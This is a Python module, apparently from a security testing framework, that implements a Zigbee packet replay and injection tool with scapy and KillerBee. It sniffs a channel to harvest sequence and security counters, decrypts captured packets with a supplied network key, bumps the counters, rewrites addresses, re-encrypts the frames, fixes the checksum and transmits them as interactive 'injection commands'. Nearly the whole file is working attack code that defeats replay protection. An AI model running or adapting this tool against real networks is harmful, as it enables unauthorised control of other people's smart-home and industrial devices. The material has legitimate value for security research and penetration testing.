from scapy import *
from scapy.layers.dot15d4 import *
from killerbee import *
from killerbee.scapy_extensions import *
from scapy.layers.zigbee import *
from scapy.utils import *
import docopt
import math
import time


import sys
import os
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))
sys.path.append("../../utils")
from utils2 import hexstr_to_str

def read_counters(fname):
    with open(fname) as source:
        lines = source.read().splitlines()
        counters = []
        try:
            for l in lines:
                counters.append(int(l))
        except ValueError:
            print("Counters file returns invalid values")
    return counters

def write_counters(fname, counters):
    """
    Write counters in file
    """
    # Flush file
    open(fname, "w").close()

    with open(fname, "a") as source:
        for c in counters:
            source.write(str(c) + "\n")

def compute_fcs(pkt):
    """
    Return byte string of FCS given a Dot15d4 packet
    """
    data = raw(pkt)
    crc = 0
    for i in range(0, len(data)):
        c = orb(data[i])
        q = (crc ^ c) & 15
        crc = (crc // 16) ^ (q * 4225)
        q = (crc ^ (c // 16)) & 15
        crc = (crc // 16) ^ (q * 4225)
    fcs = struct.pack('<H', crc)
    return fcs

def int_fcs(fcs):
    """
    Return int value of FCS
    """
    return int(fcs[len(fcs)-1].encode('hex'), 16)*16*16 + int(fcs[len(fcs)-2].encode('hex'), 16)

def update_fcs(pkt):
    """
    Update FCS of a Dot15d4FCS Packet with a new valid FCS
    """
    pkt_d15d4 = Dot15d4(raw(pkt)[:-2]) # Get Dot15d4 Packet without FCS
    fcs = compute_fcs(pkt_d15d4) # Compute new valid FCS
    fcs = int_fcs(fcs) # Compute int value of FCS
    pkt.fcs = fcs


def set_pkt_values(seqnum2, seqnum, fc, aps_counter, zcl_counter, replay_pkt, decrypted_pkt, set_sec_payload, module_args):
    """
    Sets generic packet counters and sets encrypted payload. Returns the new decrypted payload for later re-encryption.
    Set Generic (layer 3): Set packet counters.
    Set Encrypted : Sets encrypted payload (including encrypted counters) according to provided function set_sec_payload
    """

    replay_pkt[Dot15d4FCS].seqnum = seqnum2
    
    # Update generic (layer 3)
    replay_pkt[ZigbeeNWK].seqnum = seqnum
    replay_pkt[ZigbeeSecurityHeader].fc = fc
    
    # Update encrypted : APS/ZCL layers (module dependant)
    reconstructed_decrypted_pkt = set_sec_payload(aps_counter, zcl_counter, decrypted_pkt, module_args)

    #print("Counters used : " + str(seqnum2) + "," + str(seqnum) + "," + str(fc) + "," + str(aps_counter) + "," + str(zcl_counter))
    return reconstructed_decrypted_pkt
    

def set_pkt_addresses(p, addresses):
    """
    Set new addresses in the replayed packet if needed.
    Addresses set : short address for layer 2/3, panid for layer 2.
    If an address isn't provided, don't change it.
    """
    if addresses is not None:
        if Dot15d4 in p or Dot15d4FCS in p:
            # Set source layer 2
            if addresses['src_short2'] is not None:
                p.src_addr = addresses['src_short2']
            if addresses['src_panid'] is not None:
                p.src_panid = addresses['src_panid']
            # Set destination layer 2
            if addresses['dst_short2'] is not None:
                p.dest_addr = addresses['dst_short2']
            if addresses['dst_panid'] is not None:
                p.dest_panid = addresses['dst_panid']

            # Set source/destination layer 3
            if ZigbeeNWK in p:
                if addresses['src_short'] is not None:
                    p.source = addresses['src_short']
                if addresses['dst_short'] is not None:
                    p.source = addresses['dst_short']

              
def update_packet(replay_pkt, decrypted_pkt, channel, increment, key_net, addresses, check_sec_payload, set_sec_payload, verbose, module_args, nosniff=False):
    """
    Update the packet addresses and counters for replay.
    """
    
    # Update replay packet with intended source/destination
    if addresses is not None:
        set_pkt_addresses(replay_pkt, addresses)
        print("New addresses : Layer 3 " + str(hex(addresses["src_short"])) + ", Layer 2 " + str(hex(addresses["src_short2"])))
    
    # Get source/destination fields for detection
    src_lay3 = replay_pkt.source
    dst_lay3 = replay_pkt.destination
    
    seqnum2 = -1 # Layer 2 seqnum
    seqnum = -1 # ZigbeeNWK counter
    fc = -1 # ZigbeeSecHeader counter
    aps_counter = -1 # APS layer counter
    zcl_counter = -1 # Cluster counter

    if not nosniff:
        # --------------------- Sniff packets to update counters --------------------- #
        # Set KB for listening
        kb = KillerBee()
        kb.sniffer_on(channel)
        
        while True:
            try:
                kbPacket = kb.pnext()
                if kbPacket != None:
                    p = Dot15d4FCS(kbPacket['bytes'])

                    # Update seqnum
                    if hasattr(p, "src_addr") and p.src_addr == src_lay3:
                        seqnum2 = p[Dot15d4FCS].seqnum

                    # Get ZigbeeNWK Counter
                    if ZigbeeNWK in p:
                        if p.source == src_lay3 and p.destination == dst_lay3:
                            seqnum = p[ZigbeeNWK].seqnum
                            if verbose > 4: print("Seqnum detected: " + str(seqnum))
                            # Get ZigbeeSec counter
                            if ZigbeeSecurityHeader in p:
                                fc = p[ZigbeeSecurityHeader].fc
                                if verbose > 2: print("FC detected : " + str(fc))
                                
                                # Get Sec counters (depends on the module) and the decrypted packet
                                is_zcl, temp_decrypted_pkt, sec_counters = check_sec_payload(p, key_net)
                                if is_zcl:
                                    decrypted_pkt = temp_decrypted_pkt
                                    aps_counter = sec_counters[0]
                                    zcl_counter = sec_counters[1]
                                    if verbose > 1: print("##### APS detected : " + str(aps_counter) + " and ZCL detected : " + str(zcl_counter) + " ######")
                                        
            except KeyboardInterrupt:
                break

        kb.sniffer_off()
    
    # Get and set counters from either sniff or file
    counters = read_counters("../replay/counters.txt")

    seqnum2 = (seqnum2 + increment) % 255 if seqnum2 != -1 else 120
    seqnum = (seqnum + increment) % 255 if seqnum != -1 else (counters[1] + increment) % 255
    fc = (fc + increment) if fc != -1 else (counters[2] + increment)
    aps_counter = (aps_counter + increment) % 255 if aps_counter != -1 else (counters[3] + increment) % 255
    zcl_counter = (zcl_counter + increment) % 255 if zcl_counter != -1 else (counters[4] + increment) % 255

    write_counters("../replay/counters.txt", [seqnum2, seqnum, fc, aps_counter, zcl_counter])

    # Update replay packet counters, get the decrypted packet byte string
    _, decrypted_pkt, _ = check_sec_payload(replay_pkt, key_net)
    reconstructed_decrypted_pkt = set_pkt_values(seqnum2, seqnum, fc, aps_counter, zcl_counter, replay_pkt, decrypted_pkt, set_sec_payload, module_args)
    
    # Re-encrypt the updated replay pkt
    encrypted_inc_pkt = kbencrypt(replay_pkt, reconstructed_decrypted_pkt, key_net, 0)
    update_fcs(encrypted_inc_pkt)   

    # Return packet to be sent
    return encrypted_inc_pkt



class ReplayZigbeePacket:
    def __init__(self):
        self.ready = 1
        self.commands = {}
    
    def add_replay_command(self, replay_pkt, command, set_counter_func, module_args):
        """
        Add a command to the replayer, identified by a String
        Command contains a list of generic replay_pkt, a function to set the packet's non generic counters (depending on module, eg ZCL counters, or a temperature variable) and arguments to be used with that setter if needed (eg the value of temperature we want)
        """
        self.commands[command.lower()] = {
            'replay_pkt': replay_pkt,
            'set_counter_func': set_counter_func,
            'module_args': module_args,
        }

    def run(self, options, check_sec_counter, sniff_only):
        """
        Run the replayer 
        """
        # --------------------- Replayer config --------------------- #
        conf.dot15d4_protocol = "zigbee"
        channel = int(options["channel"]["Current Settings"])
        increment = int(options["increment"]["Current Settings"])
                
        # Get Network key
        key_net = options["key"]["Current Settings"]
        key_net = hexstr_to_str(key_net)
        
        # Set Addresses if needed
        keep_addr = options["keep_addr"]["Current Settings"]
        if keep_addr:
            addresses = None
        else:
            addresses = {
                'src_short': options["src"]["Current Settings"],
                'dst_short': options["dst"]["Current Settings"],
                'src_short2': options["src2"]["Current Settings"],
                'dst_short2': options["dst2"]["Current Settings"],
                'src_panid': options["panid"]["Current Settings"],
                'dst_panid': options["panid"]["Current Settings"]                
            }

        # --------------------- Do replay --------------------- #
        command = ""
        command_keys = self.commands.keys()
        while command != 'exit':
            command = raw_input("Enter injection command " + options['use']['Current Settings'] + " or exit\n> ")
            
            if command != 'exit':
                if command.lower() in command_keys:
                    print('> Command ' + command + ' loaded, sniffing started.')
                    
                    # Load set_counter function
                    set_sec_counters = self.commands[command.lower()]['set_counter_func']
                    iterations = 0
                    
                    # Load and send packets with corresponding arguments one by one
                    for i in range(len(self.commands[command.lower()]['replay_pkt'])):
                        try:
                            replay_pkt = self.commands[command.lower()]['replay_pkt'][i].copy()
                            module_args = self.commands[command.lower()]['module_args'][i]
                            decrypted_pkt, _ = kbdecrypt(replay_pkt, key_net, 0, True) # Decrypt packet
                            nosniff = True if iterations > 0 else False
                            if iterations > 0:
                                increment = 5
                            # Set counters/address accordingly, get counters
                            final_replay_pkt = update_packet(replay_pkt, decrypted_pkt, channel, increment, key_net, addresses, check_sec_counter, set_sec_counters, 5, module_args, nosniff)
                            
                            # Send updated replay packet
                            if not sniff_only:
                                kbsendp(final_replay_pkt, channel)
                            iterations += 1
                            time.sleep(0.8)
                        except KeyboardInterrupt:
                            break

                    if not sniff_only:
                        print("Injection sent")

                else:
                    print('Command not found.')